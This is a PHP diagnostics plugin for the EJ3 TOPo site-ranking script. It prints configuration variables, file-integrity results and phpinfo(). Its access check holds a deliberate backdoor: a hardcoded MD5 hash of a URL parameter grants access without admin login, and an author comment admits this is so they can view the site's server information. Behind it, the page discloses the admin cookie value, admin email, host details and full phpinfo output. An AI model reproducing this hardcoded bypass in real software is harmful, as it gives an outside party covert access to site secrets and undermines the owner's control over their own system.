<?php
//
//  plugins/TOPo_Info/index.php
//	rev002
//  PHP v4.2+
//

//----------------------------------------------------------------
// PARAMETROS DE ENTRADA
//----------------------------------------------------------------
if(isset($_POST['m'])) $modo=$_POST['m']; else $modo=$_GET['m'];
if(isset($_POST['s'])) $submodo=$_POST['s']; else $submodo=$_GET['s'];

//----------------------------------------------------------------
// CODIGO NECESARIO
//----------------------------------------------------------------
include('../../data/inc_config.php');
include('../../code/inc_functions.php');
include('../../lang/'.$gIdioma.'.php');
include('../../code/class_db_'.$gTipoDB.'.php');
include('../../code/class_topo.php');
include('../../code/class_misc.php');

//----------------------------------------------------------------
// CONTROL DE ACCESOS
//----------------------------------------------------------------
$acceso=0;

//The following line made possibility that I see your phpinfo
//You can delete if you want but then
//I can't help you if you have problems with TOPo
if(md5($modo)=='018fa61f4f7b39ef16bbb9b7ae2f1508') $acceso=1;
//------------------------------------------------------------

$cookies=new Cookies;
if($cookies->esAdmin()) $acceso=1;
if($acceso!=1) {
	echo '<SCRIPT>window.location.href="../../index.php";</SCRIPT>';
	exit();
}

if($submodo=='lang') {
	$linea=file('../../lang/'.$gIdioma.'.php');
	foreach($linea as $value) {
		$value=str_replace(array('<','{'),array('&#'.ord('<'),'&#'.ord('{')),$value);		
		echo $value.'<br>';
	}
	exit();
}

//Variables generales.
$variables[0]='gVer';
$variables[1]='gRev';
$variables[2]='gDebug';
$variables[3]='gDemo';
$variables[4]='gTipoDB';
//Configuración del Top
$variables[5]='gAdminCookie';
$variables[6]='gAdminLogin';
$variables[7]='gAdminPass';
$variables[8]='gAdminEmail';
$variables[9]='gTopNombre';
$variables[10]='gTopMetaTags';
$variables[11]='gTopCopyright';
$variables[12]='gIdioma';
$variables[13]='gTopURL';
$variables[14]='gTopURLhost';
$variables[15]='gTopURLip';
$variables[16]='gVoteImagenSimple';
$variables[17]='gEnviarCorreo';
//Personalizar Top
$variables[18]='gTema';
$variables[19]='gEstilo';
$variables[20]='gIluminar';
$variables[21]='gConBanner';
$variables[22]='gNumBloques';
$variables[23]='gWebsPorBloque';
$variables[24]='gCriterioOrden';
$variables[25]='gMinimoHits';
$variables[26]='gTiempoActualizar';
$variables[27]='gTiempoResetear';
$variables[28]='gTiempoVoto';
//Opciones
$variables[29]='gComentarios';
$variables[30]='gPuntuacion';
$variables[31]='gEstadisticas';
$variables[32]='gSitioDelMomento';
$variables[33]='gPodium';
$variables[34]='gRendimiento';
$variables[35]='gVistoBueno';
$variables[36]='gBanderas';
$variables[37]='gFrame';
$variables[38]='gAntitrampaCookies';
$variables[39]='gAntitrampaIPs';
$variables[40]='gMaxDescripcion';
$variables[41]='gMaxURL';
//Opciones Avanzadas
$variables[42]='gCompresion';
$variables[43]='gEstaPersonales';
$variables[44]='gPrecargarBanner';
$variables[45]='gMultiBanner';
$variables[46]='gBuscadorAmigable';
//Banners/Reglas/Avisos
$variables[47]='gVerBannerSup';
$variables[48]='gVerBannerMed';
$variables[49]='gVerBannerInf';
$variables[50]='gReglas';
$variables[51]='gAviso';
//Páginas Inscritas
$variables[52]='gCategorias';
$variables[53]='gTipoTop';
//No modificables por el panel de control.
$variables[54]='gTiempoOffset';
$variables[55]='gAutoActualizar';
$variables[56]='gWebsPorPagina';

$TOPoInfo='<table border="0" cellpadding="3" width="600">';
$TOPoInfo.='<tr class="h"><td>';
$TOPoInfo.='<a href="http://ej3soft.ej3.net/"><img border="0" src="../../images/ej3.gif" alt="EJ3 Soft" /></a><h1 class="p">EJ3 TOPo v'.$gVer.'.'.$gRev.'</h1>';
$TOPoInfo.='</td></tr>';
$TOPoInfo.='</table><br />';
$TOPoInfo.='<h2>Config Variables</h2>';
$TOPoInfo.='<table border="0" cellpadding="3" width="600">';
foreach($variables as $key => $value) {
	if($key==6 OR $key==7) {
		$status='<font style="color: #DD0000">[Not set]</font>';
		if(strlen($$value)) $status='<font style="color: #007700">[Set]</font>';
		$TOPoInfo.='<tr><td class="e">$'.$value.' </td><td class="v">'.$status.' </td></tr>';
	} elseif($key==12) {
		$TOPoInfo.='<tr><td class="e">$'.$value.' </td><td class="v">'.$$value.' <a href="index.php?m='.$modo.'&s=lang" target="_blank">[View]</a></td></tr>';
	} elseif($key==17) {
		$status='<font style="color: #DD0000">[mail is disabled]</font>';
		if(function_exists('mail')) $status='<font style="color: #007700">[mail is enabled]</font>';
		$TOPoInfo.='<tr><td class="e">$'.$value.' </td><td class="v">'.$$value.' '.$status.'</td></tr>';
	} elseif($key==42) {
		$status='<font style="color: #DD0000">[gzcompress is disabled]</font>';
		if(function_exists('gzcompress')) $status='<font style="color: #007700">[gzcompress is enabled]</font>';
		$TOPoInfo.='<tr><td class="e">$'.$value.' </td><td class="v">'.$$value.' '.$status.'</td></tr>';
	} else {
		$TOPoInfo.='<tr><td class="e">$'.$value.' </td><td class="v">'.$$value.' </td></tr>';
	}
}
$TOPoInfo.='</table><br />';
$TOPoInfo.='<h2>Files</h2>';
$TOPoInfo.='<table border="0" cellpadding="3" width="600">';
$TOPoInfo.='<tr class="h"><th>File</th><th>Revision</th><th>Size</th><th>Lines</th><th>Status</th></tr>';
$build=file('../../build_'.$gVer.'.'.$gRev.'.txt');
for($i=2;$i<=26;$i++) {
	$build[$i]=str_replace(' ','|',$build[$i]);
	while(strstr($build[$i],'||')) $build[$i]=str_replace('||','|',$build[$i]);
	$aux=explode('|',$build[$i]);
	if($aux[2]==filesize('../../'.$aux[0])) {
		$status='<font style="color: #007700">OK</font>';
	} else {
		$status='<font style="color: #DD0000">Missing</font>';
		if(file_exists('../../'.$aux[0])) $status='<font style="color: #DD0000">Modified ('.filesize($aux[0]).'bytes)</font>';
	}
	$TOPoInfo.='<tr><td class="e">'.$aux[0].'</td><td class="v" align="center">'.$aux[1].' </td><td class="v" align="right">'.$aux[2].' </td><td class="v" align="right">'.$aux[4].' </td><td class="v" align="center">'.$status.' </td></tr>';
}
$TOPoInfo.='</table><br />';

echo '<CENTER>'.$TOPoInfo.'</CENTER><HR>';
phpinfo();

?>